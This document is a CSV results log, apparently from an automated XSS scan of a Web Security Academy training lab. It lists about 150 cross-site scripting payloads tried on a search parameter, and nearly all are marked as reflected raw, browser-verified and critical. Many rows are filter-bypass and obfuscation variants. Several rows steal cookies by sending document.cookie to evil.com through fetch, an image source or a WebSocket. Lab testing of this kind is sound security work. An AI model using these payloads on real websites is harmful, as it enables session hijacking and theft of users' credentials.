Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script>,ESCAPED,No,,Low
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
